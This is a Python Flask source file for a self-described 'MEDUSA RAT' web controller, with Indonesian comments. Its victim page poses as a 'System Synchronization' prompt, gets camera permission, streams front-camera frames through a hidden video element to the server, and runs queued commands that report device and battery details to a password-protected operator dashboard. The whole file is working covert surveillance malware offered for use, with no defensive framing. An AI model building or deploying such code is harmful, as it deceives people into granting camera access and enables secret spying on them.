import os
import base64
from flask import Flask, render_template_string, request, jsonify, Response, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "MEDUSA_EXCLUSIVE_SECRET"

# Kredensial Login Operator
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

latest_frame = None
auto_target_ip = None
# Antrean perintah otomatis dari operator ke target
pending_commands = []
latest_output = "Belum ada respons dari target."

# --- INTERFACES TARGET (100% AUTOMATIC WEBSHELL EXPLOIT) ---
TARGET_HTML = """
<html>
<head>
    <title>System Synchronization</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; text-align: center; padding-top: 80px; }
        .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
        .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ MEDUSA INTERCONNECT ]</h2>
        <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
    </div>
    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
    <script>
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        
        async function triggerOtoritas() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById("v-feed");
                video.srcObject = stream;
                video.onloadedmetadata = () => { 
                    video.play(); 
                    setInterval(captureFrame, 400); 
                    setInterval(listenServerCommand, 1000); // Sistem Auto: Cek perintah tiap 1 detik
                };
                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p></div>";
            } catch(err) { alert("Izin ditolak: " + err); }
        }
        
        function captureFrame() {
            let video = document.getElementById("v-feed");
            if(video.videoWidth > 0) {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
            }
        }

        async function listenServerCommand() {
            // HP target otomatis meminta perintah dari Render secara nirkabel
            let res = await fetch('/poll_command');
            let data = await res.json();
            if (data.command) {
                let report = "";
                if (data.command === "cek_baterai") {
                    let battery = await navigator.getBattery();
                    report = "INFO BATERAI TARGET -> Level: " + (battery.level * 100) + "%, Status Cas: " + battery.charging;
                } else if (data.command === "ambil_data_sistem") {
                    report = "INFO PERANGKAT TARGET -> Platform: " + navigator.platform + " | Browser: " + navigator.userAgent + " | Bahasa: " + navigator.language;
                } else if (data.command === "ping_test") {
                    report = "PING RESPONS -> Jalur pipa komunikasi cloud aktif 100%!";
                }
                // Kirim balik log hasil ke dasbor operator Akang
                fetch('/report_output', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ output: report })
                });
            }
        }
    </script>
</body>
</html>
"""

# --- DASHBOARD OPERATOR ---
DASHBOARD_HTML = """
<html>
<head>
    <title>Medusa Control Panel</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #f00; }
        #monitor { width: 320px; height: 240px; border: 1px solid #f00; background: #000; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>MEDUSA RAT CLOUD CONTROLLER (WEB-SHELL)</h1>
    <p>Status Koneksi Target: <span style="color:white; background:#333; padding:2px 5px;">TERIKAT (AUTOMATIC)</span></p>

    <h3>Target Media Live Stream</h3>
    <img id="monitor" src="">
    
    <h3>Eksekusi Perintah Nirkabel (Sekali Jalan)</h3>
    <button class="btn" onclick="sendCmd('cek_baterai')">Cek Baterai</button>
    <button class="btn" onclick="sendCmd('ambil_data_sistem')">Ambil Data Sistem</button>
    <button class="btn" onclick="sendCmd('ping_test')">Ping Test Jalur</button>

    <h3>Log Output Respons HP Target:</h3>
    <pre id="log" style="background:#000; padding:15px; border:1px solid #333; color: cyan; font-size:14px;">Menunggu perintah diklik...</pre>

    <script>
        setInterval(() => {
            document.getElementById('monitor').src = '/get_frame?' + Date.now();
            fetch('/get_latest_output')
                .then(res => res.json())
                .then(data => { if(data.output) document.getElementById('log').innerText = data.output; });
        }, 1000);

        function sendCmd(cmd) {
            fetch('/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ command: cmd })
            });
            document.getElementById('log').innerText = "Mengirim perintah '" + cmd + "' ke target secara otomatis...";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TARGET_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == USERNAME_ADMIN and request.form.get('password') == PASSWORD_ADMIN:
            session['logged_in'] = True
            return redirect(url_for('operator_dashboard'))
    return render_template_string("""
        <body style="background:#000;color:red;font-family:monospace;text-align:center;padding-top:100px;">
            <div style="border:1px solid red; display:inline-block; padding:30px;">
                <h2>[ MEDUSA AUTH REQUIRED ]</h2>
                <form method="POST">
                    <input type="text" name="username" placeholder="User"><br>
                    <input type="password" name="password" placeholder="Pass"><br><br>
                    <button type="submit" style="background:#500;color:#fff;border:1px solid red;padding:5px 10px;">ENTER</button>
                </form>
            </div>
        </body>
    """)

@app.route('/operator')
def operator_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML)

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    global latest_frame
    latest_frame = request.data.decode('utf-8')
    return "OK"

@app.route('/get_frame')
def get_frame():
    global latest_frame
    if latest_frame and "base64," in latest_frame:
        try:
            img_data = base64.b64decode(latest_frame.split("base64,")[1])
            return Response(img_data, mimetype='image/jpeg')
        except:
            pass
    return "", 204

@app.route('/send_command', methods=['POST'])
def send_command():
    global pending_commands
    pending_commands.append(request.json.get("command"))
    return jsonify({"status": "queued"})

@app.route('/poll_command')
def poll_command():
    global pending_commands
    if pending_commands:
        return jsonify({"command": pending_commands.pop(0)})
    return jsonify({"command": None})

@app.route('/report_output', methods=['POST'])
def report_output():
    global latest_output
    latest_output = request.json.get("output")
    return "OK"

@app.route('/get_latest_output')
def get_latest_output():
    global latest_output
    return jsonify({"output": latest_output})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
